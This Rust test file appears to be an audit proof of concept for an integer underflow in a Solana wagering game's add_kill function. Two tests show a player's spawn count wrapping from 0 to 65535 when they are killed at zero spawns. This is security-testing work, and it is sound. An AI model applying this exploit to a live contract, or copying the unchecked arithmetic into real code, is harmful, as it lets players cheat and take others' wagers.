// Proof of Concept for Finding 1: Integer Underflow in Spawn Count
// This PoC demonstrates that killing a player with 0 spawns causes underflow to u16::MAX (65535)

#[cfg(test)]
mod tests {
    use super::*;
    use crate::state::*;
    use anchor_lang::prelude::*;

    #[test]
    fn test_spawn_underflow_vulnerability() {
        // Setup: Create a mock GameSession with players
        let mut game_session = GameSession {
            session_id: "test_session".to_string(),
            authority: Pubkey::new_unique(),
            session_bet: 1000,
            game_mode: GameMode::WinnerTakesAllOneVsOne,
            team_a: Team {
                players: [Pubkey::new_unique(), Pubkey::default(), Pubkey::default(), Pubkey::default(), Pubkey::default()],
                total_bet: 1000,
                player_spawns: [0, 0, 0, 0, 0], // Victim has 0 spawns
                player_kills: [0, 0, 0, 0, 0],
            },
            team_b: Team {
                players: [Pubkey::new_unique(), Pubkey::default(), Pubkey::default(), Pubkey::default(), Pubkey::default()],
                total_bet: 1000,
                player_spawns: [10, 0, 0, 0, 0], // Killer has 10 spawns
                player_kills: [0, 0, 0, 0, 0],
            },
            status: GameStatus::InProgress,
            created_at: 0,
            bump: 0,
            vault_bump: 0,
            vault_token_bump: 0,
        };

        // Get player keys for the test
        let victim_key = game_session.team_a.players[0]; // Team A, player 0
        let killer_key = game_session.team_b.players[0]; // Team B, player 0

        // Verify preconditions
        println!("Before attack:");
        println!("Victim spawns: {}", game_session.team_a.player_spawns[0]);
        println!("Killer spawns: {}", game_session.team_b.player_spawns[0]);
        
        // Precondition: Victim has 0 spawns
        assert_eq!(game_session.team_a.player_spawns[0], 0, "Victim should have 0 spawns");

        // Execute the attack: Call add_kill when victim has 0 spawns
        let result = game_session.add_kill(
            1, // killer_team (Team B)
            killer_key,
            0, // victim_team (Team A) 
            victim_key,
        );

        // The function should succeed (no error checking for underflow)
        assert!(result.is_ok(), "add_kill should succeed even with 0 spawns");

        // Verify the exploit: Victim's spawn count should have underflowed to u16::MAX
        println!("After attack:");
        println!("Victim spawns: {}", game_session.team_a.player_spawns[0]);
        println!("Killer kills: {}", game_session.team_b.player_kills[0]);

        // Critical assertion: Spawn count underflowed from 0 to 65535
        assert_eq!(
            game_session.team_a.player_spawns[0], 
            65535, // u16::MAX
            "Victim spawn count should underflow to u16::MAX (65535)"
        );

        // Verify killer's kill count increased
        assert_eq!(
            game_session.team_b.player_kills[0],
            1,
            "Killer should have 1 kill"
        );

        println!("EXPLOIT CONFIRMED: Player with 0 spawns now has {} spawns due to underflow!", 
                 game_session.team_a.player_spawns[0]);
    }

    #[test]
    fn test_multiple_underflows() {
        // Test that multiple underflows continue to wrap around
        let mut game_session = GameSession {
            session_id: "test_session_2".to_string(),
            authority: Pubkey::new_unique(),
            session_bet: 1000,
            game_mode: GameMode::WinnerTakesAllOneVsOne,
            team_a: Team {
                players: [Pubkey::new_unique(), Pubkey::default(), Pubkey::default(), Pubkey::default(), Pubkey::default()],
                total_bet: 1000,
                player_spawns: [1, 0, 0, 0, 0], // Victim starts with 1 spawn
                player_kills: [0, 0, 0, 0, 0],
            },
            team_b: Team {
                players: [Pubkey::new_unique(), Pubkey::default(), Pubkey::default(), Pubkey::default(), Pubkey::default()],
                total_bet: 1000,
                player_spawns: [10, 0, 0, 0, 0],
                player_kills: [0, 0, 0, 0, 0],
            },
            status: GameStatus::InProgress,
            created_at: 0,
            bump: 0,
            vault_bump: 0,
            vault_token_bump: 0,
        };

        let victim_key = game_session.team_a.players[0];
        let killer_key = game_session.team_b.players[0];

        // Kill 1: Reduce from 1 to 0 spawns (normal behavior)
        game_session.add_kill(1, killer_key, 0, victim_key).unwrap();
        assert_eq!(game_session.team_a.player_spawns[0], 0);

        // Kill 2: Underflow from 0 to 65535 spawns (vulnerability)
        game_session.add_kill(1, killer_key, 0, victim_key).unwrap();
        assert_eq!(game_session.team_a.player_spawns[0], 65535);

        // Kill 3: Reduce from 65535 to 65534 spawns (continues wrapping)
        game_session.add_kill(1, killer_key, 0, victim_key).unwrap();
        assert_eq!(game_session.team_a.player_spawns[0], 65534);

        println!("Multiple underflow test confirmed: {} spawns after 3 kills starting from 1", 
                 game_session.team_a.player_spawns[0]);
    }
}
